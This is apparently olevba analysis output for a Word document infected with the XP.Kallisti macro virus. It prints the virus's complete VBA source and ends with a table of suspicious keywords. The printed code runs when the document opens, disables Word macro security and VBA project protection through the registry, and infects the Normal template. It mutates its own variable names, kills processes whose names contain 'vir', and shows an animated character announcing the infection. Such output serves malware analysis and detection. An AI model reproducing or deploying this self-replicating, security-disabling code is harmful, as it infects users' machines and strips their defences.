olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Listi
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Listi - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
On Error Resume Next
Ę“©�Ë = Ę“©�Ë + 1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") <> 1& Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
WordBasic.FileExit dlg
End If
If VBA.GetAttr(Word.Application.ActiveDocument.FullName) = Ę“©�Ë Then
VBA.SetAttr Word.Application.ActiveDocument.FullName, (Rnd * 0)
ActiveDocument.Reload
End If
VBA.SetAttr Word.Application.NormalTemplate.FullName, (Rnd * 0)
Options.SaveNormalPrompt = vbEmpty
Set ł‚¬�� = VBA.IIf(Word.Application.MacroContainer = Word.Application.ActiveDocument, Word.Application.NormalTemplate, Word.Application.ActiveDocument)
With ł‚¬��.VBProject
With .vbcomponents.Item(Ę“©�Ë).Codemodule
If Not .lines(90, Ę“©�Ë) Like "'XP*" Then
.deletelines Ę“©�Ë, .countoflines
.insertlines Ę“©�Ë, ¬–—»‚(Word.MacroContainer.VBProject.vbcomponents.Item(Ę“©�Ë).Codemodule.lines(Ę“©�Ë, 92))
If ł‚¬�� = Word.Application.ActiveDocument Then Word.Application.ActiveDocument.SaveAs Word.Application.ActiveDocument.FullName, wdFormatDocument
End If
End With
End With
For —ČĘź• = Ę“©�Ë To Word.Tasks.Count
If VBA.InStr(Ę“©�Ë, VBA.LCase(Word.Tasks(—ČĘź•).Name), "vir") Then Word.Tasks(—ČĘź•).Close
Next
If VBA.InStr(Ę“©�Ë, VBA.Time, "5") Then
Ľ–„—ť = "Merlin"
Set ŤŤ±źź = CreateObject("Agent.Control.1")
ŤŤ±źź.Connected = True
If VBA.IsObject(ŤŤ±źź) Then
ŤŤ±źź.Characters.Load Ľ–„—ť, Ľ–„—ť & ".acs"
Set ¶™°�Ž = ŤŤ±źź.Characters(Ľ–„—ť)
With ¶™°�Ž
.Top = 100
.Left = 100
.LanguageID = &H409
.Show
End With
¶™°�Ž.Play "Greet"
¶™°�Ž.Speak "Hello, " & Word.Application.UserName & "!" & "\Vol=99"
¶™°�Ž.Play "GetAttention"
¶™°�Ž.Play "GetAttentionReturn"
¶™°�Ž.Speak "I said: 'Hello " & Word.Application.UserName & "!" & Chr(39)
¶™°�Ž.Play "Idle2_2"
¶™°�Ž.Speak "Let me tell you something about a confused girl..."
¶™°�Ž.Play "Idle1_1"
¶™°�Ž.Speak "...once she turned around and thought,"
¶™°�Ž.Play "Idle1_2"
¶™°�Ž.Speak "how damn simple it is,"
¶™°�Ž.Play "Idle1_1"
¶™°�Ž.Speak "leaving a man she once loved,"
¶™°�Ž.Play "Idle2_1"
¶™°�Ž.Speak "but she did not notice,"
¶™°�Ž.Play "Idle1_1"
¶™°�Ž.Speak "that her heart had become deaf by the pain..."
¶™°�Ž.Play "Acknowledge"
¶™°�Ž.Play "Idle1_1"
¶™°�Ž.Speak "Oh, I forgot..."
¶™°�Ž.Play "Idle2_1"
¶™°�Ž.Speak "I think you are infected with XP.Kallisti...(the first virus for Office XP ever)"
¶™°�Ž.Play "Idle1_1"
¶™°�Ž.Speak "Damn... I have to go now..."
¶™°�Ž.MoveTo 800, 600
¶™°�Ž.Play "Idle3_1"
¶™°�Ž.Play "Wave"
¶™°�Ž.Speak "Goodbye now " & Word.Application.UserName & "!"
Set ¬‡ŁÄ” = ¶™°�Ž.Hide
Do Until ¬‡ŁÄ”.Status = 0
VBA.DoEvents
Loop
ŤŤ±źź.Characters.Unload Ľ–„—ť
End If
End If
End Sub
Private Function ¬–—»‚(şľ¶„ ) 'Oh my god, it's poly...xD
Ę“©�Ë = Ę“©�Ë + 1
ÁĽťÉÂ = "¬–—»‚ şľ¶„  ÁĽťÉÂ …Čś¨ş …­¤—Ż ±”•żľ ­ĘĹ’µ Ę“©�Ë ł‚¬�� Ľ–„—ť —ČĘź• ŤŤ±źź ¶™°�Ž ¬‡ŁÄ” "
Do
­ĘĹ’µ = VBA.Left(ÁĽťÉÂ, VBA.InStr(ÁĽťÉÂ, VBA.Chr(32)) - Ę“©�Ë): ÁĽťÉÂ = VBA.Mid(ÁĽťÉÂ, VBA.InStr(ÁĽťÉÂ, VBA.Chr(32)) + Ę“©�Ë)
…­¤—Ż = VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129)) & VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129)) & VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129)) & VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129)) & VBA.Chr((VBA.Int(VBA.Rnd * 75) + 129))
Do
±”•żľ = VBA.InStr(±”•żľ + Ę“©�Ë, VBA.LCase(şľ¶„ ), VBA.LCase(­ĘĹ’µ))
If ±”•żľ Then şľ¶„  = VBA.Mid(şľ¶„ , Ę“©�Ë, (±”•żľ - Ę“©�Ë)) & …­¤—Ż & VBA.Mid(şľ¶„ , (±”•żľ + VBA.Len(­ĘĹ’µ)))
Loop While ±”•żľ
Loop While ÁĽťÉÂ <> ""
¬–—»‚ = şľ¶„ 
End Function
'XP.Kallisti
'(c) 2001 jackie // linezer0
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

